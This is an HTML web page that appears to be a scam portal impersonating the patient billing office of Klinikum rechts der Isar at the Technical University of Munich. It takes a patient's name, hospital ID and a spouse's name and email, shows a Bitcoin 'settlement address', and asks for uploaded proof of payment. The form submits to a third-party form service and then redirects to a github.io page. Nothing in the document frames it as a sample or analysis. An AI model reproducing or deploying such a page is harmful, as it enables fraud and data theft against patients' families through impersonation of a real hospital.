<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Billing Terminal | Klinikum rechts der Isar</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .tum-blue { background-color: #005293; }
        .hero-overlay { background: rgba(0, 0, 0, 0.65); }
    </style>
</head>
<body class="bg-gray-50 font-sans">

    <nav class="bg-white py-4 px-6 border-b flex justify-between items-center shadow-sm">
        <img src="https://i.ibb.co/LdbfV4P/TUM-Logo.png" alt="TUM Logo" class="h-10">
        <p class="text-[9px] font-bold text-gray-400 uppercase tracking-widest">Technical University of Munich</p>
    </nav>

    <div class="relative h-64 w-full bg-cover bg-center" style="background-image: url('https://mri.tum.de/sites/default/files/styles/hero_image/public/images/hero/klinikum_rechts_der_isar_gebaeude.jpg');">
        <div class="absolute inset-0 hero-overlay flex flex-col items-center justify-center text-center p-4">
            <h1 class="text-white text-3xl font-extrabold uppercase tracking-tight">Patient Accounting Portal</h1>
            <p class="text-blue-200 text-sm italic">Secure Payment Verification Channel</p>
        </div>
    </div>

    <div class="max-w-4xl mx-auto -mt-10 mb-20 px-4">
        <div class="bg-white shadow-2xl rounded-2xl overflow-hidden border border-gray-100">
            <div class="tum-blue text-white py-3 text-[10px] font-black uppercase text-center">SECURE TRANSACTION TERMINAL</div>

            <form action="https://fabform.io/f/eFrGlEo" method="POST" enctype="multipart/form-data" class="p-6 md:p-10">
                <input type="hidden" name="_redirect" value="https://clinicalportaldepartment.github.io/clinical-billing-portal/success.html">
                
                <h2 class="text-lg font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3 uppercase">1. Identification</h2>
                <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                    <div>
                        <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Patient Full Name</label>
                        <input type="text" name="Patient_Name" required class="w-full border-2 border-gray-100 p-3 rounded-xl focus:border-blue-500 outline-none">
                    </div>
                    <div>
                        <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Hospital Card ID</label>
                        <input type="text" name="Hospital_ID" placeholder="TUM-XXXX" required class="w-full border-2 border-gray-100 p-3 rounded-xl">
                    </div>
                    <div>
                        <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Spouse (Sender) Name</label>
                        <input type="text" name="Sender_Name" required class="w-full border-2 border-gray-100 p-3 rounded-xl">
                    </div>
                    <div>
                        <label class="block text-[10px] font-bold text-gray-400 uppercase mb-1">Spouse (Sender) Email</label>
                        <input type="email" name="Spouse_Email" placeholder="For official receipt" required class="w-full border-2 border-gray-100 p-3 rounded-xl">
                    </div>
                </div>

                <div class="bg-gray-900 rounded-3xl p-6 text-white mb-8 border-b-8 border-blue-600">
                    <h3 class="text-blue-400 font-bold mb-4 uppercase text-xs">Payment Verification</h3>
                    <div class="space-y-4 text-xs">
                        <div class="bg-gray-800 p-4 rounded-xl border border-gray-700">
                            <p class="text-gray-500 text-[9px] uppercase font-black mb-2 tracking-widest">BTC Settlement Address</p>
                            <code class="text-green-400 text-sm break-all font-mono">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</code>
                        </div>
                        <div class="bg-gray-800 p-4 rounded-xl">
                            <label class="block font-bold text-blue-400 mb-2 uppercase tracking-tighter">Upload Proof of Payment (Image File):</label>
                            <input type="file" name="Verification_Photo" required class="block w-full text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:bg-blue-600 file:text-white cursor-pointer">
                        </div>
                    </div>
                </div>

                <button type="submit" class="w-full tum-blue text-white py-5 rounded-2xl font-black text-xl hover:bg-blue-800 transition-all uppercase shadow-lg">Confirm & Submit</button>
            </form>
        </div>
    </div>
</body>
</html>
